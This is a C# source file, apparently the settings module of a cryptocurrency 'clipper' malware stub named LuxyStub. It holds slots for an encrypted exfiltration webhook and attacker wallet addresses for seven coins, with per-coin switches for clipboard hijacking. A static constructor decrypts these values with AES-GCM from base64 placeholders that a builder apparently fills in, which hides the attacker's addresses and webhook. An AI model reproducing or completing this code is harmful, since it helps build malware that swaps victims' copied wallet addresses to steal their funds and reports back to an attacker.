using LuxyStub.Components.Algorithms;
using System;
using System.Linq;
using System.Text;

namespace LuxyStub.Modules.Clipper
{
    internal static class Settings
    {
        internal static string Webhook { get; set; }

        internal static string BtcAddr { get; set; }
        internal static string EthAddr { get; set; }
        internal static string DogeAddr { get; set; }
        internal static string LtcAddr { get; set; }
        internal static string DashAddr { get; set; }
        internal static string XmrAddr { get; set; }
        internal static string BchAddr { get; set; }

        internal static bool BtcClip { get; set; }
        internal static bool EthClip { get; set; }
        internal static bool DogeClip { get; set; }
        internal static bool LtcClip { get; set; }
        internal static bool DashClip { get; set; }
        internal static bool XmrClip { get; set; }
        internal static bool BchClip { get; set; }

        static Settings()
        {
            var key = "";
            var iv = "";

            var encryptedWebhook = "";

            var btcAddr = "";
            var ethAddr = "";
            var dogeAddr = "";
            var ltcAddr = "";
            var dashAddr = "";
            var xmrAddr = "";
            var bchAddr = "";

            var btcClip = false;
            var ethClip = false;
            var dogeClip = false;
            var ltcClip = false;
            var dashClip = false;
            var xmrClip = false;
            var bchClip = false;

        // ---------------- Initialise variables ----------------

            var conv_key = Convert.FromBase64String(key);
            var conv_iv = Convert.FromBase64String(iv);
            Webhook = Decrypt(Convert.FromBase64String(encryptedWebhook), conv_key, conv_iv);

            BtcAddr = Decrypt(Convert.FromBase64String(btcAddr), conv_key, conv_iv);
            EthAddr = Decrypt(Convert.FromBase64String(ethAddr), conv_key, conv_iv);
            DogeAddr = Decrypt(Convert.FromBase64String(dogeAddr), conv_key, conv_iv);
            LtcAddr = Decrypt(Convert.FromBase64String(ltcAddr), conv_key, conv_iv);
            DashAddr = Decrypt(Convert.FromBase64String(dashAddr), conv_key, conv_iv);
            XmrAddr = Decrypt(Convert.FromBase64String(xmrAddr), conv_key, conv_iv);
            BchAddr = Decrypt(Convert.FromBase64String(bchAddr), conv_key, conv_iv);

            BtcClip = btcClip;
            EthClip = ethClip;
            DogeClip = dogeClip;
            LtcClip = ltcClip;
            DashClip = dashClip;
            XmrClip = xmrClip;
            BchClip = bchClip;
        }

        static string Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {

            var cipherText = encryptedData.Take(encryptedData.Length - 16).ToArray();
            var tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

            var aesgcm = new AesGcm();
            var decrypted = aesgcm.Decrypt(key, iv, null, cipherText, tag);

            return Encoding.UTF8.GetString(decrypted);
        }
    }
}
